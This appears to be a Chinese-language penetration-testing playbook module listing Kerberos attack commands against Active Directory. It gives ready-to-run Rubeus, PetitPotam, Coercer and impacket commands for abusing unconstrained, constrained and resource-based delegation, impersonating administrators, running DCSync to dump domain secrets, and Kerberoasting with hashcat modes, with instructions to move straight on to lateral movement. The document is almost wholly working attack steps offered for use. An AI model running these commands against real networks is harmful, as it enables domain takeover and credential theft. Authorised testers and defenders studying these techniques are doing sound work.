# Kerberos 攻击详细命令

---

## 非约束委派（Unconstrained）

条件：拿下配了非约束委派的机器 + 该机器本地管理权限。

```
# 被动监控（等高权用户来访）
.\Rubeus.exe monitor /interval:5 /nowrap
# [*] Found new TGT: User: Administrator@CORP.COM → 抓到

# 主动逼DC来认证
python3 PetitPotam.py <被控机IP> <DC-IP>
# 或: Coercer coerce -t <DC-IP> -l <被控机IP>
# monitor抓到 DC01$@CORP.COM 的TGT

# 注入票+DCSync
.\Rubeus.exe ptt /ticket:<base64>
impacket-secretsdump -k -no-pass DC01$@dc.corp.com
```

域控默认就配非约束委派——拿到任意非约束委派机器 + coercion = 拿域。

## 约束委派（Constrained / S4U）

条件：有约束委派账户的hash/密码 + 知道msDS-AllowedToDelegateTo的SPN。

关键坑：SPN只校验主机不校验服务类。`time/dc` 可改 `cifs/dc`、`ldap/dc`（可DCSync），用 `/altservice` 指定。

```
# Rubeus
.\Rubeus.exe s4u /user:sqlsvc /rc4:<hash> /impersonateuser:administrator \
    /msdsspn:MSSQLSvc/dc01.corp.com /altservice:cifs,host,ldap /ptt

# impacket
impacket-getST -spn cifs/dc01.corp.com -impersonate administrator \
    corp.com/sqlsvc -hashes :<hash>
export KRB5CCNAME=administrator@cifs_dc01.corp.com@CORP.COM.ccache
impacket-psexec -k -no-pass corp.com/administrator@dc01.corp.com
```

## RBCD（Resource-Based Constrained Delegation）

条件：对目标机器有GenericWrite（可写msDS-AllowedToActOnBehalfOfOtherIdentity）。

```
# 1. 创建机器账户（或用已有的）
impacket-addcomputer corp.com/jen:'pass' -computer-name FAKE$ -computer-pass FakePass

# 2. 设RBCD（让目标信任FAKE$代理）
impacket-rbcd corp.com/jen:'pass' -delegate-from FAKE$ -delegate-to TARGET$ -dc-ip DC-IP -action write

# 3. S4U拿票
impacket-getST corp.com/FAKE$:FakePass -spn cifs/TARGET.corp.com -impersonate administrator -dc-ip DC-IP

# 4. 用票
export KRB5CCNAME=administrator@cifs_TARGET.corp.com@CORP.COM.ccache
impacket-psexec -k -no-pass corp.com/administrator@TARGET.corp.com
```

---

## 现代Kerberos环境补充（2026）

### Kerberoast不要固定RC4

从 `/ad-recon` 先记录：

```
msDS-SupportedEncryptionTypes
DC补丁状态
实际TGS etype
```

请求票据：

```
impacket-GetUserSPNs corp.com/jen:'pass' -dc-ip DC-IP -request -outputfile tgs.hash
```

看前缀：

```
grep -m1 -o '\$krb5tgs\$[0-9]*\$' tgs.hash
```

```
etype 23 → hashcat -m 13100
etype 17 → hashcat -m 19600
etype 18 → hashcat -m 19700
```

砸完立刻用爆出的口令/NT 继续本模块（PTH/WinRM/委派）。`-m` 查表可读 `../../creds/references/hash-types.md`，**不要切 `/creds`**。

Windows 2026 Kerberos RC4 hardening后，不再把“SPN存在”直接当成“RC4票据一定可拿”。

### Authentication Reflection

Ghost SPN / Unicode Kerberos reflection / CVE-2026-26128：

→ **auth-reflection.md**（同目录）

### Identity Confusion

ResetNightmare / KerberLoss：

→ **identity-confusion.md**（同目录）
